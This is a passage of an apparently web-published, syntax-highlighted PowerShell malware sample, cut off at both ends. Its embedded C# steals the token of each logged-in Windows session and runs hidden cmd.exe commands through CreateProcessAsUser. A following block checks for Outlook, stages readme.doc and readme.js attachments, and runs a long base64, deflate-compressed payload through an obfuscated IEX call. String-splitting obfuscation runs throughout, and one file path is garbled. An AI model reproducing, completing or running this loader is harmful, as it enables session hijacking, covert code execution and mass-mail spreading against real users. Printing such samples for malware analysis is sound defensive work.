ProcessExtensions</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        private const uint INVALID_SESSION_ID = 0xFFFFFFFF;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;CreateProcessAsUser&quot;, SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]</span></span><br><span class="line"><span class="string">        private static extern bool CreateProcessAs&#x27;</span>+<span class="string">&#x27;User(</span></span><br><span class="line"><span class="string">            IntPtr hToken,</span></span><br><span class="line"><span class="string">            String lpApplicationName,</span></span><br><span class="line"><span class="string">            String lpCommandLine,</span></span><br><span class="line"><span class="string">            IntPtr lpProcessAttributes,</span></span><br><span class="line"><span class="string">            IntPtr lpThreadAttributes,</span></span><br><span class="line"><span class="string">            bool bInheritHandle,</span></span><br><span class="line"><span class="string">            uint dwCreationFlags,</span></span><br><span class="line"><span class="string">            IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">            String lpCurrentDirectory,</span></span><br><span class="line"><span class="string">            ref STARTUPINFO lpStartupInfo,</span></span><br><span class="line"><span class="string">            out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;DuplicateTokenEx&quot;)]</span></span><br><span class="line"><span class="string">        private static extern bool DuplicateTokenEx(</span></span><br><span class="line"><span class="string">            IntPtr ExistingTokenHandle,</span></span><br><span class="line"><span class="string">            uint dwDesiredAccess,</span></span><br><span class="line"><span class="string">            IntPtr lpThreadAttributes,</span></span><br><span class="line"><span class="string">            int TokenType,</span></span><br><span class="line"><span class="string">            int ImpersonationLevel,</span></span><br><span class="line"><span class="string">            ref IntPtr DuplicateTokenHandle);</span></span><br><span class="line"><span class="string">        [DllImport(&quot;userenv.dll&quot;, SetLastError = true)]</span></span><br><span class="line"><span class="string">        private static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);</span></span><br><span class="line"><span class="string">        [DllImport(&quot;userenv.dll&quot;, SetLastError = true)]</span></span><br><span class="line"><span class="string">        [return: MarshalAs(UnmanagedType.Bool)]</span></span><br><span class="line"><span class="string">        private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);</span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span></span><br><span class="line"><span class="string">        private static extern bool CloseHandle(IntPtr &#x27;</span>+<span class="string">&#x27;hSnapshot);</span></span><br><span class="line"><span class="string">        [DllImport(&quot;Wtsapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        private static extern bool WTSQueryUserToken(uint SessionId, ref IntPtr phToken);</span></span><br><span class="line"><span class="string">        [DllImport(&quot;wtsapi32.dll&quot;, SetLastError = true)]</span></span><br><span class="line"><span class="string">        private static extern int WTSEnumerateSessions(</span></span><br><span class="line"><span class="string">            IntPtr hServer,</span></span><br><span class="line"><span class="string">            int Reserved,</span></span><br><span class="line"><span class="string">            int Version,</span></span><br><span class="line"><span class="string">            ref IntPtr ppSessionInfo,</span></span><br><span class="line"><span class="string">     &#x27;</span>+<span class="string">&#x27;       ref int pCount);</span></span><br><span class="line"><span class="string">        [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">        privat&#x27;</span>+<span class="string">&#x27;e struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            public IntPtr hProcess;</span></span><br><span class="line"><span class="string">            public IntPtr hThread;</span></span><br><span class="line"><span class="string">            public uint dwProcessId;</span></span><br><span class="line"><span class="string">            public uint dwThreadId;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">        private struct STARTUPINFO</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            public int cb;</span></span><br><span class="line"><span class="string">            public String lpReserved;</span></span><br><span class="line"><span class="string">            public String lpDesktop;</span></span><br><span class="line"><span class="string">            public String lpTitle;</span></span><br><span class="line"><span class="string">            public uint dwX;</span></span><br><span class="line"><span class="string">            public uint dwY;</span></span><br><span class="line"><span class="string">            public uint dwXSize;</span></span><br><span class="line"><span class="string">            public uint dwYSize;</span></span><br><span class="line"><span class="string">            public uint dwXCountChars;</span></span><br><span class="line"><span class="string">            public uint dwYCountChars;</span></span><br><span class="line"><span class="string">            public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">            public uint dwFlags;</span></span><br><span class="line"><span class="string">            public short wShowWindow;</span></span><br><span class="line"><span class="string">            public short cbReserved2;</span></span><br><span class="line"><span class="string">            public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">            public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">            public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">            public IntPtr hStdError;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        private enum WTS_CONNECTSTATE_CLASS</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            WTSActive,</span></span><br><span class="line"><span class="string">            WTSConnected,</span></span><br><span class="line"><span class="string">            WTSConnectQuery,</span></span><br><span class="line"><span class="string">            WTSShadow,</span></span><br><span class="line"><span class="string">            WTSDisconnected,</span></span><br><span class="line"><span class="string">            WTSIdle,</span></span><br><span class="line"><span class="string">            WTSListen,</span></span><br><span class="line"><span class="string">            WTSReset,</span></span><br><span class="line"><span class="string">            WTSDown,</span></span><br><span class="line"><span class="string">            WTSInit</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">        private struct WTS_SESSION_INFO</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            public readonly UInt32 SessionID;</span></span><br><span class="line"><span class="string">            [MarshalAs(UnmanagedType.LPStr)]</span></span><br><span class="line"><span class="string">            public readonly String pWinStationName;</span></span><br><span class="line"><span class="string">            public readonly WTS_CONNECTSTATE_CLASS State;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        private static void StartProcessWithToken(ref IntPtr hUserToken,string cmd)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            STARTUPINFO startInfo = new STARTUPINFO();</span></span><br><span class="line"><span class="string">            PROCESS_INFORMATIO&#x27;</span>+<span class="string">&#x27;N procInfo = new PROCESS_INFORMATION();</span></span><br><span class="line"><span class="string">            IntPtr pEnv = IntPtr.Zero;</span></span><br><span class="line"><span class="string">if(CreateEnvironmentBlock(ref pEnv,hUserToken,false))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">Console.WriteLine(&quot;Create Environment Block Success&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            startInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));</span></span><br><span class="line"><span class="string">            uint dwCreationFlags = 0x00000400 | 0x08000000;</span></span><br><span class="line"><span class="string">//uint dwCreationFlags = 0x00000400 | 0x00000010;</span></span><br><span class="line"><span class="string">            startInfo.wShowWindow = 0;</span></span><br><span class="line"><span class="string">            startInfo.dwFlags = 1;</span></span><br><span class="line"><span class="string">            startInfo.lpDesktop = &quot;winsta0\\default&quot;;</span></span><br><span class="line"><span class="string">            if (CreatePr&#x27;</span>+<span class="string">&#x27;ocessAsUser(hUserToken,</span></span><br><span class="line"><span class="string">                &quot;c:ij6&#x27;</span>+<span class="string">&#x27;XM\windows\\system32\\cmd.exe&quot;,</span></span><br><span class="line"><span class="string">                &quot;/c &quot;+cmd,</span></span><br><span class="line"><span class="string">                IntPtr.Zero,</span></span><br><span class="line"><span class="string">                IntPtr.Zero,</span></span><br><span class="line"><span class="string">                false,</span></span><br><span class="line"><span class="string">                dwCreationFlags,</span></span><br><span class="line"><span class="string">                pEnv,</span></span><br><span class="line"><span class="string">                null,</span></span><br><span class="line"><span class="string">                ref startInfo,</span></span><br><span class="line"><span class="string">                out procInfo))</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">            Console.WriteLine(&quot;Start Process Success&quot;);</span></span><br><span class="line"><span class="string">            &#125; else </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Console.WriteLine(Marshal.GetLastWin32Error());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">            CloseHandle(hUserToken);</span></span><br><span class="line"><span class="string">            CloseHandle(procInfo.hThread);</span></span><br><span class="line"><span class="string">            CloseHandle(procInfo.hProcess);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        public static void EnumSessionsAndExecCmd(string cmd)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            IntPtr hImpersonationToken = IntPtr.Zero;</span></span><br><span class="line"><span class="string">            IntPtr pSessionInfo = IntPtr.Zero;</span></span><br><span class="line"><span class="string">            int sessionCount = 0;</span></span><br><span class="line"><span class="string">            int arrayElementSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));</span></span><br><span class="line"><span class="string">            IntPtr phUserToken = IntPtr.Zero;</span></span><br><span class="line"><span class="string">            if (WTSEnumerateSessions(IntPtr.Zero, 0, 1, ref pSessionInfo, ref sessionCount) != 0)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                Int64 current = pSessionInfo.ToInt64();</span></span><br><span class="line"><span class="string">                for (int i = 0; i &lt; sessionCount; i++)</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure((IntPtr)(current), typeof(WTS_SESSION_INFO));</span></span><br><span class="line"><span class="string">                    current += arrayElementSize;</span></span><br><span class="line"><span class="string">                    Console.WriteLine(&quot;Get Session ID:&quot;+si.SessionID);</span></span><br><span class="line"><span class="string">                    if (WTSQueryUserToken(si.SessionID, ref hImpersonationToken))</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                    Console.WriteLine(&quot;Get Session Token Success&quot;);</span></span><br><span class="line"><span class="string">                    if (DuplicateTokenEx(hImpersonationToken, 0, IntPtr.Zero, 2, 1, ref phUserToken))</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                    Console.WriteLine(&quot;Duplicate Token Success&quot;);</span></span><br><span class="line"><span class="string">                    StartProcessWithToken(ref phUserToken,cmd);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="string">Add-Type -TypeDefinition $msource</span></span><br><span class="line"><span class="string">$mail_code=@&#x27;</span></span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">get-childitem</span> C:\Users\<span class="variable">$env:username</span>\AppData\Local\Microsoft\Outlook).count <span class="operator">-gt</span> <span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$base_url</span>=<span class="string">&quot;CORE_URL&quot;</span></span><br><span class="line"><span class="variable">$att_doc</span>=<span class="variable">$env:tmp</span>+<span class="string">&quot;\readme.doc&quot;</span></span><br><span class="line"><span class="variable">$att_js</span>=<span class="variable">$env:tmp</span>+<span class="string">&quot;\readme.js&quot;</span></span><br><span class="line">IE`x <span class="variable">$</span>(<span class="built_in">New-Object</span> IO.StreamReader (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.Compression.DeflateStream (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.MemoryStream (,<span class="variable">$</span>([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvfe6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iztfLaVtUy7Rp6715/m7rd6Nf7vzi3zj5se2frorl1vfe5O/a8elyWs2K5cX3Hz366s2zg/FF3k6u27yR1j9zXtV5Np3/4t/t9x+/qV63NbXc+vjd3sd3fsmd3zj5Jb9xYjtZ7356u06WBf2ef+1+imUr/SzXC+7ne5OinVbLy7xu85o6sK9/70nRnnhfUI9PuMfvEYx7e99nCHfGdb4qs2m+9dH2R6OPProzbquyusrrLem3ON/6XX+3Sdbkv/+6LtGf/eOzj+Ztu3p09+7u3oPxDv23+xF9m7Xt7z+rpp99nI3r9vxj/eSnm88+3h3/dPMxw7Qg0s9S+/u4WU8aQXxntLtz55OPPv7k448+iX1P3xIQGldDBPns453xA/RzXpT5Mlvknynhp/Os/t73v7+1fzAe33/wyaf3x+OHO588fDAe7+7t3fmZz/N2+1W2nFWLdPukWi/bdPc+dTpupi3GcUGD+P2ni9lnH9E/6d1pugJRmnlelun2VTovZrN8mZ6d/gHvtl7kf8DV9peTn/4D8mmbvsjb8Xfzyc&#x27;</span>+<span class="string">&#x27;kfUBb5sr0zflpdLZ9X2cxMqR3P3Qer8Wq++j1+8vTVtxZZUYJq3/rd101eYxC/+7d+92m1WK1b8+fHn3zvdHlZ1NVyQXBpNr98/ZNCgLESYvxF9tNVfedwslqnfj8ATqRf/R4YEfX28Z2P3JzT3x+NDCnvmHG3RVvmn3388tWXb05P3pw+TZ9+efLVF6cv3nxsWxBXf/bxm3nRpKB7Sj9XddUSBfJZOrlOvyimddVU52365fl5Mc3HL8ucEEpphibU/HRWtESOlOifEou2NKS0rdImz9MWMKmLNcY5Roc/3Wh3d+9yh8+0w0ldvc2X4zRN0YrmQ+bLTlSZfu9Vfl7mLDfj46bJF5PymkiH+fhu0c5fZnVbZOULIvDWxxbj8U8WzTorn2RNMf34zuH3ol+MzwjpOmPQBJGYiRiAetr6uJnWxap99Lu3i9Xv/vtapvz4zvj0XT7d2rnzC8FdQHTL8tgnH/3CWV6m8op75yNPNj8m2fx9P/4IM3Sevc1XWTv/7KOTR7+v+cN7SygGHfPZx5dZnYJ/P1vmV+kxYXuZ/96K6Efffc2Yjl+Dpz+6c6htScYszzctUSi9O0mXNLWrbJZ+9Il9i388W5dMvk8+Sn/hNyUhH7/59ulXr5735OOnm03i8b7yYXqx0kE0g3CQdBzS6Mf1erkl1BiROrpz+LGbC3mTxMaqxWF&#x27;</span>+<span class="string">&#x27;52jLc+8lHf0D9Byw/+tbW3s7OzidbpIu3a9Y+d373XfqENE9KX+7u7PW+u/OJmc8xUWixdefOz1TrdpvFTpUr2D9rs89+T5r8x7/H7/3F89Qox492xzsf/R5H9LHwZZm39Af9WecXBQ0uAwP/xgnJUDrLpQm/dv7TP1ispj99+YtWH8m3JN0XxSzyhd/Tjn42LbOmQetfvLez/+DB/smz7ad793e395/t7G0f3L//ZHvvyemDnfsH93cP9p/8En2rzhdVC/Xw2Udtvc71U+B+18dW8Bdc0zJbXqyzC3rlO8KRH6H97/q9k6fHb46/JxDw3Mz/41c04x9DMj+WGb8qaAquxtOyavKtO4e/cfL97zMu0rNgoX8IVT/6PXWCtpUdaMphUml2Vtn0LWH5+/MsfbRDPPDRJ1vqlqRWdIkJOl+o&#x27;</span>+<span class="string">&#x27;dPMX/NzjBuoDpFu2xZggXLTzT3bv3Bl633uPuUVf8dvj4ztesw50+kq9HB+011zHEWtuh/h+0Il28zyb5bUh3e7OfSbEnhLkQH7c3/l099N7n07o3wefSovgCYjmz4Z2fnfvzh03T8S4v2/FbMI/FhP8uNrFv/PdX/z7fgu/MI+nL+WFX6IfAiIpSR/nT4LuPnEj0OeXgP1/N/KVPvvdSE+ymoSWPPtyTAoxzxavGBRh3fn2hPRfnTes2Z6SmcvaXF7oN/2CBKu+Nt+Ofret76lbSGryWV0tyKLln+4b/ftgsvPt3+fJu++UxVeL53v3fq/83sPf6+FX9e+9/+3X85OzJxen129+n7enxz/x4IvPz36QZ68fPNldvbr+YvWLrn/Rk+vFT373p35yd/Hs7dMvHvzU3sHDh/cfPHhw79695eXl5Xn+6Zf3d7/8zt3z87s/eDj9qcVPPJm8nHxJ/X5nWXx+/Iuai/OX9+4ffPsHB8X55enl3eW9+uH8/PLuk+effver3U++XH2y98l3Pm/3Hnzn97lsvnv56cOvmuzey08flpf72e5q8eanXnzSfrpa7n96/pOz5/fOyk/u7e9/5/zg9PKL3RfTe6+Xs73ZJz9o9x8uJ2/z1xd3H67utstPfnB++SC/d373+epq5+HLl/f2inv7k5dfnN+/v16+vJ58+/ze7MvZ/sOD5frB5bdXk/p1+fDh1YN3bw4efHnw8MvlD+799L2f3p9ln19cPHz99Bc9ufqpn7776uXVwbdfTV7evXx18OnL5d3r85d3r9ffPvjJV3d/0eUPdqnD6pPZt39QfTKd5OcPzk++/IlP9vJnL5cHy7vf/uT6+Xdn+8vlJ8/ffHV3+eD497539RPP936v5f7u8tndB0/vTj6dtXf3n+TvLtdf/sQyvze/e/1y+fvkD768unv3/M3bT168ePD0/oPp+YPVt3/vKnu6Xzz96b3f57v3Xn35RXn1nbv57N3duztP7u//Pr/35dPz5tMXDx7cXTYPL3evv3yw+uSL02/Pv7j85CfuLx+8+cHBTy4vf/qnzpe/z7vP71+cX9z/vb/c+cH0E5qTh3v5V7/PTz95+IPJweTh/c/zl0/Kva8&#x27;</span>+<span class="string">&#x27;Ovrw6qd/d/fzuSXv58t7yJz6Z/eAn7n1VPKt+77vffvrgyc7O3dnd+0/ughyvDu49eHn3XTv5RXd/cLmYvnvycnf/5bf32rvffnj/ory/88l69uyTB+8ePP+9713ee/DJ3cuXD/ZeLq/zu/nL/PfeOcnfvj375PzlT+/9ZL338JMH83vVm51PfurBT327WO88/L1ml5+sPj19+sniwdP9d7/3+u79L9+82d87//abnfsvZ/ODT/KXP7UzuT/75NvffvJ7/+BqP7/37YdX6180+33unX/67sXLva9+0Zcv7n/+1RefFHv3zvNXn75+eL678+7ui9m9y5c/9e73vj759O3Dy8nLX/TT9/fP9+++OPn0i7J8cv5773/n5YOH7w4uD44/vkPPKP1eRz69378gO05i9zSf6mfcvhskHr8+OTuj2AzC/6Y6Xc627qTb56lRJaOI7RhFlK0olt9ftNFnPb3w/3MFs1nBfPvyuw/OSaofXr5oLl9e772730zWP5jdvXvvBz/1Uy+uzh9+8ZPvpi9Jd336yaefLvOHP7i4++LB+u5P7Xz78vrhJ3t3y4eLB9lPLQ8OFjs/ePvJ5cnDu+Xq9z74JFsefPn6k5OX1+fPfrB+WK8flPd+cPfdJ8v13fbei7sPzmft/cvmp9vZ3ezyQX3+5qfW09/77oMHy93Jd9rvXP/eDwmVB6ft/Kfenn/6yf173929/k5298HdcmfZ/uSLe+3z5S+6W/3eD87vFffuziaXnxz8ou/u/tQLGkSz83t/cv6g/cFkPfnkB29IFVQP7+6dHywmv8/q9N6nv8/lwe+13Hu2e/Xw7vV3P5mevng6y99NflFTXLQ/eLH74JMffF6tr17tzj992i4uH35Csvbg4Pd+dXL34O7q7sOX5w8/eXnwsv1F5z+1993JZbH/3frhOQnn8/3Xn168OX7ePPz07ZOf+uqL6U98+uXD8+nqrP3O8ruvVj/58O2Dn/zBO9L6xxeL63XxiyY/9fTl7zX9RZOn3746vnfWFCe/z0X74Mn84bcvHn5y9fonfu/TJsuu7v7es+/efX735esXP9h98OTbB3sH+dPL8/bi95ms7n/72+3vdXDwvJ7m9w/mT6f7v+jp3u9dXN37qsl/Yr3fXp/85OL3eVdkv/dq//m9Tw9e/cTB9ec/Qerj1d3v/tTzi/XLu/cW9z//NrX/yeuH1R4F/g/Pnl3+PhfF73OSzcr7z0lB7P7g5frLH/zg8vJBMX/3yScP892Hz9vTZ3fb87p6cPBlvZz91Kd3y5/Kv/3dzyf3dh7sPSkfftK0P0kK7qd2f+9v/+Dq98m//XvXe3cXb3/wi+6uF6efP7jOd08+P3n+++wuP5+9+X3q1benzy6yJ9+59/QH+7P85cF3mp9s3p&#x27;</span>+<span class="string">&#x27;WTfJavr768O7v/Ew9+8PCn7n+5c11dPfzBF/uT2ZMd0lSnv9f8/Pd63Sx/7/17k4e/6OD3biYvrr/49ouf/vLLycn698nO337y+/zU/OWb+ZcHq3dkmNbfKcuLef6Tv/fBq5Nvz37wxRfNt5/Py7vrb8+uDn7v6efP75U/mH35YH6/qb5z7+p+WRz/3i9On/70d7/zZu/Vd5/V97/68mJ17/e+PKvqk4Ofmp6/mv703&#x27;</span>+<span class="string">&#x27;ePZ8sFPX/90kX97vf/pL7o3mU5/Mv+q/b32Tx78xMGnJ292n9x/9/DJ6/kn36328ntffPWTL/IHT15cT37w8unDB1efX929PJitjx88/eLe6vn5q/L4y/P5T3/37Gr1tH34xYv708sHNMM/cfziy1fH9z598Sa/evruy71f9Gq+/+4X7Z3stT+RLT5ZZlcvfp+L+/XdV/W9ybc/+fLi6aQon10+eFZNv9y/f/DmIPt09dP33p1P1/fLZz89+0Xv6ieLg/MfvKj3LvOf/M75vd/7wcN7X7xd/9Tuu/3qycV32p/a+YknV8+fXByvv734RU9/4snL3/snpj9B/HVx/OnpvWZC/srpVz948OlOe/zTF/feHCx+or18+uTp01XTPjz97nF2MlntzX+f7/7g+OL4k4un7VdfHX969eXuq594Wv/UfJL9opOdk+8+nf5gZ/9edlG/fvn0J774/Hz69MWbF999dvDTP/lTv2h+fnzv/OAnVhfV8flXe4tPq+f3T78z+UU//cn+08XrX3T88Py7P/WLLi5XP7G7+L3efbL&#x27;</span>+<span class="string">&#x27;49vVP3V2fH3+xuD599oPnT+uL9uqnPsnuztp393/RveniyYPj8+Lp2U883H/7g+nk+NsnTf7s8tsvlj89e3P+6sEnkwvC+/zZg0/urT95u3j6ZG//F90rX0yePDv+5NWzy/2L48&#x27;</span>+<span class="string">&#x27;nTy4dtVVw9/Yndh9PvHv/Uxcvd+e/zpD2++9Wzi8+bpw/PaLw/8XL31e9zsPN5+ZM/+dM/WV6SDrn3g19Ebsv1J89+8BP19f1757Pd32t9cP/eJ69gsO825zurT2Y/&#x27;</span>+<span class="string">&#x27;vf/lyyc/8fSTonpanb94t/ry6klRnX7xpJm09/a//fDsfO/Bp/mX51cvdh5cfXH+6ZfHX5YHl09efPLp2ZPTlw9+&#x27;</span>+<span class="string">&#x27;6vjb6werZ3d/4vn53WdXTx++3H/++t1333w5rX+vs88f3pvdvfc8X+a/z3Lx7uHdtrjKX977wZuTe+Xnl6fT6vzh8XXz05805w93T5/8Pj+Vrb96cvn58+vLN/eef/ftu9XvNbn7e7/77g+yn1yvm8v63mX2i37wbPJ7f2d38Xs/+GRv8uL3Ktrf++Dq+u7zF9PnX10+/6n1L9qtTvNsubuzO3n27vwHZfnp4u1PTfZXe8UPdr968Onrew/Of+r8u8+Ls8UvejX7vRefvv5k8Z2fOq+/WNxd5LMHn+y3d+89u7u38+m9J9TsxWyn/c6r19kXB8sfZA9+0e/zYPf4fLf5vb746Zc/+Pzs9Wz2g+/uLC6+/fvsnX+6992v8sn+V8vVl+WL77zcfbh6N9v9gsZZXjcvd7999uz3+XJ5uXf9gx/Mrnfney+vi4NPV/lPndx72P6iX/T8FxUPsk/v39t58mb/F/3UT+5/Z7b3i777g+/+1LPv7v5gsft7/eA7zw6+e7D44t71d8733v3e7e91+cmk/s5PvfuU+PL1aufk3cPF7Pf+qSezZ1fLn/70p5+9fvv569MXzecH1eft6e7s957ufnLvwe/zyeT+5eWz+sXe3eonvtvm1U/OfvLN+qv1/ZPzX3RvVn+Sl5+cf3rQTh6+ePD5we75qv3yJ8vFg2L37pf3f2r6nTc/kX2nOH/X1LvT++13f9Ei/8kyr746/0WLyf36+eWXn37n9949vdy594u++93dT8rL1Q+qn35Y332zePDFi7tfPG/eLad3d+9/Mnn5+eWT3S/3Fqfrvfm9i2p+8Prpw2e/z+L3afdmRJX5d0+vfp+s3nnz5vdZTe89OfmJ/cWXv/cPXr+4frd39mX+jDzVB/eKdvXlp9Xk0ze/993zh/PZi3OymffePHi2uPyJ+gfTkwcX99anD6/vVa8/aV6Qf/Ds1Re797/75cMnk2K9X75Y/eA7v9f5u/nO6+Xk3t3vFucPHrxYffnFp8+q9mzSfnH+U/WDefnk7vru5erdoqzqT9aLxZN75Jj/9A9+n5N8dv/Bq+nv/ZPNk7sPf+L3Pjgulg9ekef7+zSfXJ3/RP28Pf6Ji4svfvqrnXtkT6dPvnj77buXn9z9dvPg3vnDvS9f36s+WT58efc7L57uzL+8fvjFwevjnzj7zsHqfLG/oIYPT+/ePT59ee/i4fzF3d979e1303cv7h6c7b54efLyBy/nX9xdzL799t7d6eLu+vTl3lX17enDX/SDq58+uDe9u/qJT3+ifDZ72Nz/znfzT+uTX/R7fX5RHC9+cnFw9+rei+e/14udxf0FOcMPH778wYOX2dnvQ3HT/vlP3f/pkt598ObdtH64Xl7+3ueru/VPv/wy//I7u02zs7p77/d6+ZPrqqq+yC6f3v19XjZPf/pt9fLLy/X9u+uvPlk9e1k/uPd7/d67T36vT17un//ed5c7+19++9nxT//gwYPLB09/cPfhT76om5cPf/p87+7uV/fa3bsHL59QrDd598mn05cvl3v75zt3s5efPt17cq95uf/0p3+63v9ydu9872H+8PnkB82Dp5e/Dxy3+tuXPzF9OVsffOfeCwoEH7zJyUo/uXv67PnvfffyqzeXn1785E+dzy7u73z7xfOLZ4vJD+5f764+ubp8O/+pk7cvP7n7+3znk2cUQU328p0vD158d/p7X3/3p3ZffHo++6md7Adns4fkFb06L5/tlg+vvrtbf/Lu8jtX384XD5/ce7v/3XffmT58un7Qfnn95Rc/+fLB+YviJyYHTXP3F2Xn7bq8W12WOemQ891PXv/0713+5OrhQUna8dOsePLw1fr3fn1WPt+7+OLLMlv93r/3dyfr1bPf5ye/Il9k913+nPTXp+9+75d3Hzz/RasHxCOU4r579+H9e7/3q2cvf9Hdh58ud3+vn/7y+d22ffCLXr74dlsd/173fq/dRfV7/T6f7j/55Ad75ztnefngk+VP/tTbycO9t2/yBweX7U/+5PTu2auf+om7Xx4/n55Pnv703d/7J59dPq9+euc7k3sPq4tX8+9c5s+nq/L43uTTd+fP68lPry73Hn73p9f3chKmd+c/9cXu/ldf/aD+Rb9o+eXe3c93vttetz9oPqEo/pPp/W+fv7o323u4/KndB3dfrIu7J9+9e/9lXn558hPL1d7Le2fTtz+4+4NPl59kv8/Ou7Pfa1H9ojd&#x27;</span>+<span class="string">&#x27;fzu4W9/YuP12c7nx+9815Qc7vTz7Plr/Pt0/bydudd9nJq596+Xv/1OrFw/r3Otm5PiiJGvd/itTGi99r+Z0y+3JyTrR5/nl97+D5+v7r1zurxcO70/InXr96ePlTP/22+ST79MvX0/XZxYMvrj9pf1E+eVvNHry7fP2Tx5c/VS4mZ6/PDr7z6U/f/86b029/Ocl/7/LbxfwH974s3n3y4HLv4Lr+Rbvf/ak35y/u/+T0frYmLpnce/akepN/h1zHgxfF7109fPH8ywcP27flvcW7+0/Pz6tX+cGr+u7b2U/ee/Xq5fUnP/F7ffJTb+9eXn3y7jvLuz9x/NOLZzvN4vTlqvxBubq/V375U7/Xt8+ff/J73/vk/sPi4Mn5V+vf63jvzdNvf/rm8uCkPj/+7uz155c7Jw9p7h++3Ln7uvl09e716/y71999+3s9Pa1++vlZ/fDT1++uP71+cLC78+kPvnj91U+sPj0pyHa0r6/fLKts+cl5e3VZ3P3uZPeT+89Pnr9ov/OTxf3v7BIhn17OH/6iV999+PIXffdufXnx8pNf9JPr6596e1lev/69H07qL4rZy6r9tP2U7ODvde/d7MvfZ7d5Uuz9Xt/Z+fLb9+aTX/Twy+Lu9dvi1dWr9dPvvCRCffrJV1+9+0XLs+fHV9X8O/UX9Xd/0dVP/d73n9396smybtafv6u/ePv2xVc/+dMvZvd3fuL5i+/8xE9Pfu/5i4fXn35n9e&#x27;</span>+<span class="string">&#x27;nv3Z7Mvlpk1S/67hffvXjw1cFP/153V2efLB/cX/3kyXWe/dR3fnBSfvn7/F7LT2bPPyl+nwfL+2fHX5188nb/+fLdoi6qu9++t7x3/Ht9lZXT37v5vc5PX8xePG9Wd/fnk6fPXn8y3b0+O335vH65dy9/M3twd733e/+i+7+oebtsH/zg8sXrb1+fvfzqFxW/z9uq3b347mL+7gef/t53f/CgLqe7P7U7/6nfq1p+5/whJbWm96u7X/70vbvnP53fp5+fvIRInj794vL0p36v83sH1fkPvvj2+qfJzLy5PD+/d/8Xne+/Pb5/NoMOfXD/8iVpzR/83t9+cHLx8un5k/X90/O9+sFdglFNDqqr32u5yk4f3l3UBy+fffnk4d1scfbm1ZtXxU/8Xvni7MHuy/OLJn85nd/7RV98Mn373fzJ/uvzp3dfLz95df/q5Mvf5+n52af091fLlz+d7+9/med36+vLl+/uVj/YP/90+ml1d3r37f3r89fLq8Xpwaf5rPnOT9/9wbfPy/v1+pPZ73Vwev0TD06+fXnv2ye/1/KLh5/cu/d779y/92K689NvXr4gB2iWf1V/9YMXe1d1+5Pty/s/+fIhJf2XB9/J5/sP785m3/7kB7N7O7TgWfzU3tXBq3z/p+7WRKS73/nJF7/Xu8vr3/vqyckv+uo7v891Nbk72b2cfkU5m9dv1u++WPzUJ/fvfuf64vTuD776wfX007fvvvjp5/eXn7z4cvcn6+Knjk+Wv9eThzsnX7y5+3svL84ffPXw3neezo9fPvxFv8+X559mT19Sdmxv/ewnvv3wVbP8svjB88Xd6ReTvcn+pz948Mkn5dvz+9e/9yf57zO7e355sjvfmb7MzvPvPrk3e9Zetgc7